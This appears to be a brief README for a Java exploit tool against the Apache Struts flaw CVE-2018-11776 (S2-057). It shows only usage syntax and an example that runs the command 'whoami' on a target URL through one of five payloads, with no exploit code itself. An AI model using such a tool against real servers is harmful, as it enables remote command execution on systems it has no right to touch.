# CVE-2018-11776 （S2-057）

```
[*] Usage:
        S2-057.jar <url> <action> <command> <payload (1-5)>

[*] Example:
        S2-057.jar "http://example.com/struts2-showcase/" "/actionChain1.action" "whoami" 4
```

![20180922](https://raw.githubusercontent.com/iBearcat/S2-057/master/20180922.jpg)
